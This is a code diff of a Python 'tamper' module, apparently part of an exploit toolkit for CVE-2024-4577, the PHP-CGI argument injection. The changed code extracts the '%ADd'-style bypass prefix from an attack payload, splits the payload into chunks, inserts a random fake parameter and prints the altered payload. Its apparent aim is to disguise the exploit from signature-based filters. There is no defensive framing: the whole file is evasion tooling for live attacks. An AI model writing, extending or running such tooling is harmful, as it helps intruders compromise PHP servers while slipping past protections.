@@ -1,40 +1,49 @@
 # tamper_insert_dummy_element.py
-
 import random
 import string
-from exploit import PAYLOAD_ELEMENTS, CVE_PREFIXES  
+import re
 
 name = "tamper_insert_dummy_element"
-description = "從 payload 元素中隨機插入一個干擾用的隨機假參數（非真實 PHP 設定）"
+description = "從 payload 中插入干擾的假參數"
 
 def generate_fake_element():
     key = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
     return f"{key}%3d1"
 
-def tamper(data):
-    ids = data.get("element_ids")
-    cve = data.get("cve_id", "CVE-2024-4577")
-    prefix = CVE_PREFIXES.get(cve, "%ADd")
+def extract_prefix(payload):
+    match = re.search(r'(%[a-zA-Z0-9%-]+)\+', payload)
+    return match.group(1) if match else "%ADd"
 
-    if not ids or not isinstance(ids, list):
+def split_payload(payload, prefix):
+    parts = payload.split("+")
+    chunks = []
+    i = 0
+    while i < len(parts) - 1:
+        if parts[i] == prefix:
+            chunks.append(f"{parts[i]}+{parts[i+1]}")
+            i += 2
+        else:
+            i += 1
+    return chunks
+
+def tamper(data):
+    payload = data.get("payload", "")
+    if not payload:
         return data
 
-    # 插入位置：隨機 1~len (不在最前面)
-    insert_index = random.randint(1, len(ids))
+    prefix = extract_prefix(payload)
+    chunks = split_payload(payload, prefix)
 
-    # 建立新 element 列表，並插入假參數
-    modified = ids.copy()
+    if not chunks:
+        return data
 
-    # 隨機產生假參數
-    fake_payload = generate_fake_element()
+    fake_param = f"{prefix}+{generate_fake_element()}"
+    insert_index = random.randrange(0, len(chunks) + 1)
 
-    # 將 fake payload 插入對應位置（作為字串）
-    new_payload_parts = []
-    for i, eid in enumerate(modified):
-        if i == insert_index:
-            new_payload_parts.append(f"{prefix}+{fake_payload}")
-        new_payload_parts.append(f"{prefix}+{PAYLOAD_ELEMENTS[eid]}")
+    new_chunks = chunks.copy()
+    new_chunks.insert(insert_index, fake_param)
 
-    # 更新 payload
-    data["payload"] = '+'.join(new_payload_parts)
+    data["payload"] = "+".join(new_chunks)
+    print(f"[{name}] 使用 prefix: {prefix}")
+    print(f"[{name}] payload 改為：{data['payload']}")
     return data
